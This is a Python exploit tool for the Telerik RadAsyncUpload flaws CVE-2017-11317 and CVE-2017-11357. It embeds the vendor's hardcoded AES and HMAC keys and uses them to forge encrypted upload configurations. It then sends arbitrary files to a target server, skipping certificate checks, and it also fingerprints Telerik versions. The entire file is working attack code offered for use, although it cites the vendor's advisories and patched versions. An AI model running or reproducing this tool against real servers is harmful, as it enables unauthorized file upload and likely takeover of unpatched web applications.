#!/usr/bin/python3

# Author: Paul Taylor / @bao7uo
# https://github.com/bao7uo/RAU_crypto/blob/master/RAU_crypto.py

# RAU crypto - Exploiting CVE-2017-11317, CVE-2017-11357

# Telerik Web UI for ASP.NET AJAX
# RadAsyncUpload hardcoded keys / insecure direct object reference
# Arbitrary file upload

# Telerik mitigated in June 2017 by removing default keys in
# versions R2 2017 SP1 (2017.2.621) and providing the ability to disable the
# RadAsyncUpload feature in R2 2017 SP2 (2017.2.711)

# https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload
# https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/insecure-direct-object-reference
# http://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security

# http://target/Telerik.Web.UI.WebResource.axd?type=rau

import sys
import base64
import json
import re
import requests
import os
from Crypto.Cipher import AES
from Crypto.Hash import HMAC
from Crypto.Hash import SHA256

import binascii

# Warning, the below prevents certificate warnings,
# and verify = False in the later code prevents them being verified

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class RAUCipher:
    key = binascii.unhexlify("EB8AF90FDE30FECBE330E807CF0B4252" +
                             "A44E9F06A2EA4AF10B046F598DD3EA0C")
    iv = binascii.unhexlify("E330E807CF0B425255A3A561A707D269")

    def encrypt(plaintext):
        sys.stderr.write("Encrypting... ")
        encoded = ""
        for i in plaintext:
            encoded = encoded + i + "\x00"
        plaintext = encoded + (
                                chr(16 - (len(encoded) % 16)) *
                                (16 - (len(encoded) % 16))
                            )
        cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
        sys.stderr.write("done\n")
        return base64.b64encode(cipher.encrypt(bytes(plaintext, encoding = "utf8"))).decode()

    def decrypt(ciphertext):
        sys.stderr.write("Decrypting... ")
        ciphertext = base64.b64decode(ciphertext)
        cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
        unpad = lambda s: s[0:-ord(chr(s[-1]))]
        sys.stderr.write("done\n")
        return unpad(cipher.decrypt(ciphertext[0:])).decode()[0::2]

    def addHmac(string, Version):

        isHmacVersion = False

        # "Encrypt-then-MAC" feature introduced in R1 2017
        # Required for "2017.1.118", "2017.1.228", "2017.2.503"

        if "2017" in Version:
            isHmacVersion = True

        hmac = HMAC.new(
            b'PrivateKeyForHashOfUploadConfiguration',
            bytes(string.encode()),
            SHA256.new()
            )
        hmac = base64.b64encode(hmac.digest()).decode()
        return string + hmac if isHmacVersion else string


def getProxy(proxy):
    return { 'http' : proxy, 'https' : proxy }


def rauPostData_enc(partA, partB):
    data = "-----------------------------62616f37756f2e\r\n"
    data += "Content-Disposition: form-data; name=\"rauPostData\"\r\n"
    data += "\r\n"
    data += RAUCipher.encrypt(partA) + "&" + RAUCipher.encrypt(partB) + "\r\n"
    return  data

def rauPostData_prep(TempTargetFolder, Version):
    TargetFolder = RAUCipher.addHmac(
                                "jgas0meSrU/uP/TPzrhDTw==",
                                Version
                                )
    TempTargetFolder = RAUCipher.addHmac(
                                RAUCipher.encrypt(TempTargetFolder),
                                Version
                                )

    partA = \
        '{"TargetFolder":"' + TargetFolder + '","TempTargetFolder":"' + \
        TempTargetFolder + \
        '","MaxFileSize":0,"TimeToLive":{"Ticks":1440000000000,"Days":0,"Hours":40,"Minutes":0,"Seconds":0,"Milliseconds":0,"TotalDays":1.6666666666666666,"TotalHours":40,"TotalMinutes":2400,"TotalSeconds":144000,"TotalMilliseconds":144000000},"UseApplicationPoolImpersonation":false}'

    partB = \
        "Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=" + \
        Version + ", Culture=neutral, PublicKeyToken=121fae78165ba3d4"
    
    return rauPostData_enc(partA, partB)


def getVersion(url, proxy = False):
    sys.stderr.write("Contacting server... ")
    response = requests.get(url, verify=False, proxies = getProxy(proxy))
    html = response.text
    sys.stderr.write("done\n")
    match = re.search(
        '((?<=\<\!-- )20\d{2}(.\d+)+(?= --\>))|' +
        '(?<=Version%3d)20\d{2}(.\d+)+(?=%2c)|' +
        '(?<=Version=)20\d{2}(.\d+)+(?=,)',
        html
        )

    if match:
        return match.group(0)
    else:
        return "No version result"


def payload(TempTargetFolder, Version, payload_filename):
    sys.stderr.write("Local file path: " + payload_filename + "\n")
    payload_filebasename = os.path.basename(payload_filename)
    sys.stderr.write("Destination file name: " + payload_filebasename + "\n")
    sys.stderr.write("Destination path: " + TempTargetFolder + "\n")
    sys.stderr.write("Version: " + Version + "\n")
    sys.stderr.write("Preparing payload... \n")
    payload_file = open(payload_filename, "rb")
    payload_file_data = payload_file.read()
    payload_file.close()

    data = rauPostData_prep(TempTargetFolder, Version)
    data += "-----------------------------62616f37756f2e\r\n"
    data += "Content-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
    data += "Content-Type: application/octet-stream\r\n"
    data += "\r\n"
    data += payload_file_data.decode('raw_unicode_escape') + "\r\n"
    data += "-----------------------------62616f37756f2e\r\n"
    data += "Content-Disposition: form-data; name=\"fileName\"\r\n"
    data += "\r\n"
    data += "RAU_crypto.bypass\r\n"
    data += "-----------------------------62616f37756f2e\r\n"
    data += "Content-Disposition: form-data; name=\"contentType\"\r\n"
    data += "\r\n"
    data += "text/html\r\n"
    data += "-----------------------------62616f37756f2e\r\n"
    data += "Content-Disposition: form-data; name=\"lastModifiedDate\"\r\n"
    data += "\r\n"
    data += "2019-01-02T03:04:05.067Z\r\n"
    data += "-----------------------------62616f37756f2e\r\n"
    data += "Content-Disposition: form-data; name=\"metadata\"\r\n"
    data += "\r\n"
    data += "{\"TotalChunks\":1,\"ChunkIndex\":0,\"TotalFileSize\":1,\"UploadID\":\"" + \
            payload_filebasename + "\"}\r\n"
    data += "-----------------------------62616f37756f2e--\r\n"
    data += "\r\n"
    sys.stderr.write("Payload prep done\n")
    return data


def upload(data, url, proxy = False):
    sys.stderr.write("Preparing to send request to " + url + "\n")
    session = requests.Session()
    request = requests.Request(
                        'POST',
                        url,
                        data=data
                        )
    request = request.prepare()
    request.headers["Content-Type"] = \
        "multipart/form-data; " +\
        "boundary=---------------------------62616f37756f2e"
    response = session.send(request, verify=False, proxies = getProxy(proxy))
    sys.stderr.write("Request done\n")
    return response.text


def decode_rauPostData(rauPostData):
    rauPostData = rauPostData.split("&")
    rauJSON = RAUCipher.decrypt(rauPostData[0])
    decoded = "\nJSON: " + rauJSON + "\n"
    TempTargetFolder = json.loads(rauJSON)["TempTargetFolder"]
    decoded = decoded + "\nTempTargetFolder = " + \
                        RAUCipher.decrypt(TempTargetFolder) + "\n"
    rauVersion = RAUCipher.decrypt(rauPostData[1])
    decoded = decoded + "\nVersion: " + rauVersion + "\n"
    return decoded


def mode_decrypt():
    # decrypt ciphertext
    ciphertext = sys.argv[2]
    print("\n" + RAUCipher.decrypt(ciphertext) + "\n")


def mode_Decrypt_rauPostData():
    # decrypt rauPostData
    rauPostData = sys.argv[2]
    print(decode_rauPostData(rauPostData))


def mode_encrypt():
    # encrypt plaintext
    plaintext = sys.argv[2]
    print("\n" + RAUCipher.encrypt(plaintext) + "\n")


def mode_Encrypt_rauPostData():
    # encrypt rauPostData based on TempTargetFolder and Version
    TempTargetFolder = sys.argv[2]
    Version = sys.argv[3]
    print(
        "rauPostData: " +
        rauPostData_prep(TempTargetFolder, Version) +
        "\n"
    )


def custom_payload(partA, partB):
    return  rauPostData_enc(partA, partB) \
    + "-----------------------------62616f37756f2e\r\n" \
    + "Content-Disposition: filename=\"bao7uo\"\r\n" \
    + "\r\n" \
    + "-----------------------------62616f37756f2e--\r\n"


def mode_encrypt_custom_Payload():
    print(
        "Custom Payload: \n\n" + custom_payload(sys.argv[2], sys.argv[3])
    )


def mode_send_custom_Payload(proxy = False):
    print(upload(custom_payload(sys.argv[2], sys.argv[3]), sys.argv[4], proxy))    


def mode_send_custom_Payload_proxy(): 
    mode_send_custom_Payload(sys.argv[5])


def mode_version_proxy():
    mode_version(sys.argv[3])


def mode_version(proxy = False):
    # extract Telerik web ui version details from url
    url = sys.argv[2]
    print(getVersion(url, proxy))


def mode_payload():
    # generate a payload based on TempTargetFolder, Version and payload file
    TempTargetFolder = sys.argv[2]
    Version = sys.argv[3]
    payload_filename = sys.argv[4]
    print("Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2e")
    print(payload(TempTargetFolder, Version, payload_filename))


def mode_Post_Proxy():
    mode_Post(sys.argv[6])


def mode_Post(proxy = False):
    # generate and upload a payload based on
    # TempTargetFolder, Version, payload file and url
    TempTargetFolder = sys.argv[2]
    Version = sys.argv[3]
    payload_filename = sys.argv[4]
    url = sys.argv[5]

    print(upload(payload(TempTargetFolder, Version, payload_filename), url, proxy))


def mode_help():
    print(
        "Usage:\n" +
        "\n" +
        "Decrypt a ciphertext:               -d ciphertext\n" +
        "Decrypt rauPostData:                -D rauPostData\n" +
        "Encrypt a plaintext:                -e plaintext\n\n" +

        "Generate file upload rauPostData:   -E c:\\\\destination\\\\folder Version\n" +
        "Generate all file upload POST data: -p c:\\\\destination\\\\folder Version ../local/filename\n" +
        "Upload file:                        -P c:\\\\destination\\\\folder Version c:\\\\local\\\\filename url [proxy]\n\n" +

        "Generate custom payload POST data : -c partA partB\n" +
        "Send custom payload:                -c partA partB url [proxy]\n\n" +

        "Version in HTTP response:           -v url [proxy]\n\n" +

        "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau"
    )


sys.stderr.write("\nRAU_crypto by Paul Taylor / @bao7uo \n")
sys.stderr.write(
        "CVE-2017-11317 - " +
        "Telerik RadAsyncUpload hardcoded keys / arbitrary file upload\n\n"
        )

if len(sys.argv) < 2:
    mode_help()
elif sys.argv[1] == "-d" and len(sys.argv) == 3:
    mode_decrypt()
elif sys.argv[1] == "-D" and len(sys.argv) == 3:
    mode_Decrypt_rauPostData()
elif sys.argv[1] == "-e" and len(sys.argv) == 3:
    mode_encrypt()
elif sys.argv[1] == "-E" and len(sys.argv) == 4:
    mode_Encrypt_rauPostData()
elif sys.argv[1] == "-c" and len(sys.argv) == 4:
    mode_encrypt_custom_Payload()
elif sys.argv[1] == "-C" and len(sys.argv) == 5:
    mode_send_custom_Payload()
elif sys.argv[1] == "-C" and len(sys.argv) == 6:
    mode_send_custom_Payload_proxy()   
elif sys.argv[1] == "-v" and len(sys.argv) == 3:
    mode_version()
elif sys.argv[1] == "-v" and len(sys.argv) == 4:
    mode_version_proxy()
elif sys.argv[1] == "-p" and len(sys.argv) == 5:
    mode_payload()
elif sys.argv[1] == "-P" and len(sys.argv) == 6:
    mode_Post()
elif sys.argv[1] == "-P" and len(sys.argv) == 7:
    mode_Post_Proxy()
else:
    mode_help()
